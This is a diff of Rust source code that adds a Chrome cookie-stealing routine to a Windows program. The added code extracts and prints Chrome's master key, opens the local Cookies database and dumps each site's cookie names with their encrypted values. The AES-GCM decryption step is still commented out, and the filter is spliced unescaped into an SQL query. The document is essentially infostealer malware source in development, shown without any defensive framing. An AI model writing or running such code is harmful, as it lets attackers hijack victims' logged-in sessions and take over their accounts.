@@ -1,3 +1,4 @@
+use rusqlite::Connection;
 use windows::core::PWSTR;
 use windows::{Win32::Foundation::*, Win32::Security::*};
 use std::ptr::null_mut;
@@ -11,6 +12,9 @@ use windows::Win32::Security::Cryptography::{
 };
 use windows::Win32::System::Com::CoTaskMemFree;
 use windows::Win32::System::Memory::{GlobalAlloc, GMEM_ZEROINIT};
+use aes_gcm::Aes256Gcm;
+use aes_gcm::KeyInit;
+use aes_gcm::aead::Aead;
 
 fn get_master_key(cipher: *mut u8, key_size: u32) {
     let mut data_in = CRYPT_INTEGER_BLOB {
@@ -60,11 +64,6 @@ fn extract_key(data: &str) -> Option<String> {
 
             // Allocate memory using GlobalAlloc
             let mem_ptr = unsafe { GlobalAlloc(GMEM_ZEROINIT, key_len + 1) }.unwrap();
-            
-            if mem_ptr.0.is_null() {
-                eprintln!("Failed to allocate memory.");
-                return None;
-            }
 
             // Copy data into allocated memory
             let key_cstr = CString::new(key_data).unwrap();
@@ -92,20 +91,72 @@ fn get_data_from_path() -> Result<String, std::io::Error> {
     fs::read_to_string(&path)
 }
 
+fn decrypt_cookie(key: &str, data: &str) -> String {
+    let master = base64::decode(key).unwrap();
+    let cookie = hex::decode(data).unwrap();
+
+    let nonce = &cookie[3..15];
+    let ciphertext = &cookie[15..(cookie.len() - 16)];
+    let tag = &cookie[(cookie.len() - 16)..cookie.len()];
+
+    println!("Key length: {}", master.len());
+    println!("Master key decoded: {:?}", base64::decode(master));
+    //err invalid length
+    
+    // let cipher = Aes256Gcm::new_from_slice(&master).expect("something happened");
+    // let plaintext = cipher.decrypt(nonce.into(), ciphertext).unwrap();
+
+    // return String::from_utf8(plaintext).unwrap();
+
+    return "".to_owned();
+
+}
+
+fn dump_data(path: &str, key: &str, filter_opt: Option<&str>) {
+    let filter = match filter_opt {
+        Some(filter) => format!("WHERE host_key LIKE '%{}%'", filter),
+        None => "".to_string(),
+    };
+
+    let conn = Connection::open(path).expect("Failed to open database");
+
+    let mut stmt = conn.prepare(&format!(
+        "SELECT host_key, name, hex(encrypted_value) FROM cookies {};",
+        filter
+    ))
+    .unwrap();
+
+    let rows = stmt.query_map([], |row| {
+        let host_key: String = row.get(0)?;
+        let name: String = row.get(1)?;
+        let encrypted_value: String = row.get(2)?;
+        let decrypted_value = decrypt_cookie(key, &encrypted_value);
+        
+        Ok((host_key, name, decrypted_value))
+    }).unwrap();
+
+    for row_result in rows {
+        let (host_key, name, decrypted_value) = row_result.unwrap();
+        println!("{}:{}={};", host_key, name, decrypted_value);
+    }
+}
+
 fn main() {
     match get_data_from_path() {
         Ok(data) => {
             let data_str: &str = &data;
             // Do something with data_str
             //println!("{}", data_str);
+            let base64_key = extract_key(&data).unwrap();
 
-            println!("{}", extract_key(&data).unwrap());
+            println!("Chrome master key extracted: {}", &base64_key);
+
+            let mut path = env::home_dir().unwrap_or_default();
+            path.push(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
+        
+            dump_data(path.to_str().unwrap(), &base64_key, None)
         },
         Err(e) => eprintln!("Failed to read the file: {}", e),
     }
 }
-// fn main() {
-//     // Sample call
-//     let cipher = vec![0u8; 10].into_boxed_slice(); // example data
-//     get_master_key(cipher.as_ptr() as *mut _, cipher.len() as u32);
-// }
+
